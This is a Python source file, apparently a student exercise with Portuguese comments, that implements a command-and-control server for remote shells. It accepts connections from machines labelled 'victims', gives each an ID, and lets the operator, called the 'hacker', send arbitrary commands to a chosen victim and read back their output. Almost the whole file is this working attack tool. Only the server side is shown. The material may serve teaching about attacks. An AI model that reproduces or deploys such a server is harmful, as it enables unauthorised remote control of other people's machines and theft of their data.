# 1. nao existe commando pré definido
# 
# 2. a cada conexao de uma vitima deve ser atribuido
# um identificador, e este identificador deve
# ser mostrado em tela
# 
# 3. [Multithreading] a qq momento o hacker pode iniciar um novo ataque
# digitando o id da vitima e o comando a ser executado (pegar só o stdout)
# 
# 4. quando receber a resposta da vitima, o servidor deve imprimir
# o output junto com o endereço IP, a porta e o identificador da vitima
# 
# 5. quando uma vitima se desconectar, o servidor deve detectar e imprimir
# na tela anunciando o identificador da vitima 

import itertools 
import socket 
import threading
import sys
import select

HEADER = 64
PORT = 5050
SERVER = socket.gethostbyname(socket.gethostname())
HOST = ''
ADDR = (HOST, PORT)
FORMAT_UTF = "utf-8"
FORMAT_WINDOWS = "cp1252"

counter = itertools.count()

def get_msg(s, address):
  try:
    msg_length = s.recv(HEADER).decode(FORMAT_UTF)
    msg_length = int(msg_length)
    msg = s.recv(msg_length).decode(FORMAT_WINDOWS)
    return msg
  except BlockingIOError:
    print('BlockingIOError :(, try again, may the force be with you')
  except:
    # remove from active connections
    if s in s_connections:
      s_connections.remove(s)
    print('connecion lost from', address, file=sys.stderr)

def attack_victim(id, command):
  try:
    conn = id_to_conn[id]
    try:
      conn.sendall(command.encode(FORMAT_UTF))
      print('sending {0} to {1}'.format(command, conn.getpeername()), file=sys.stderr)
    except:
      if conn in s_connections:
        s_connections.remove(conn)
      print('connecion already lost from %s with id %d' % (conn.getpeername(), id), file=sys.stderr)
      conn.close()
  except KeyError:
    print("O id {0} nao esta cadastrado com uma conexão ainda. Digite um id existente ou espere algum cliente se conectar".format(id))

def handle_input():
  while True:
    IDs_to_IPs = {k:v.getpeername()[0] for k,v in id_to_conn.items()}
    print("client:id pairs:", IDs_to_IPs)
    print("#######Enter id/command below: #########")
    params_attack = input()
    if len(params_attack) < 3:
      print("Invalid input, using last one or default", file=sys.stderr)
      command_attack_local = command_attack
      id_attack_local = id_attack
    else:
      try:
        id_attack_local = int(params_attack.split("/")[0])
        command_attack_local = params_attack.split("/")[1]
      except ValueError:
        print("Invalid input, using last one or default", file=sys.stderr)
    print("******* type 'y' to attack now or 'n' to attack later, below *******")
    bool_attack = input()
    if (bool_attack == 'y'):
      attack_victim(id_attack_local, command_attack_local)
    else:
      print("No attack for now", file=sys.stderr)

def init():
  # defaults
  global command_attack
  command_attack = "dir"
  global id_attack
  id_attack = 0
  print("default id/command:", (id_attack, command_attack))

  # id:socket 
  global id_to_conn 
  id_to_conn = {}
  # socket:id
  global conn_to_id
  conn_to_id = {}

  thread = threading.Thread(target=handle_input, daemon=True)
  thread.start()

  # Create a TCP/IP socket
  global server
  server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  server.setblocking(0)

  # printa endereco local do socket do servidor
  print('starting up on %s port %s' % ADDR, file=sys.stderr)
  server.bind(ADDR)

  # Listen for incoming connections
  server.listen(100)

def start():
  # Sockets from which we expect to read - active connections
  global s_connections
  s_connections = [ server ]

  while s_connections:
    # Wait for at least one of the sockets to be ready for processing
    print('\nwaiting for the next event', file=sys.stderr)
    readable, _, exceptional = select.select(s_connections, [], [])

    for s in readable:
      if s is server:
        # A "readable" server socket is ready to accept a connection
        connection, client_address = s.accept()
        # Set an id:connection pair
        id = next(counter)
        id_to_conn[id] = connection
        conn_to_id[connection] = id
        # printa a conexao
        print('new connection from {0} with id {1}'.format(client_address, id), file=sys.stderr)
        connection.setblocking(0)
        s_connections.append(connection)
      
      else:
        client_address = s.getpeername()
        data = get_msg(s, client_address)
        if data:
          id = conn_to_id[s]
          # printa dados recebidos
          print('received data from {0}, with id {1}:'.format(client_address, id), file=sys.stderr)
          print(data)
        else:
          # remove from active connections
          if s in s_connections:
            s_connections.remove(s)
          print('connecion lost from', client_address, file=sys.stderr)
          
    for s in exceptional:
      client_address = s.getpeername()
      print('handling exceptional condition for', client_address, file=sys.stderr)
      # Stop listening for input on the connection
      s_connections.remove(s)
      s.close()
    
    IDs_to_IPs = {k:v.getpeername()[0] for k,v in id_to_conn.items()}
    print("client:id pairs:", IDs_to_IPs)

print("[INIT] server is initializing...", file=sys.stderr)
init()
print("[START] server is starting...", file=sys.stderr)
start()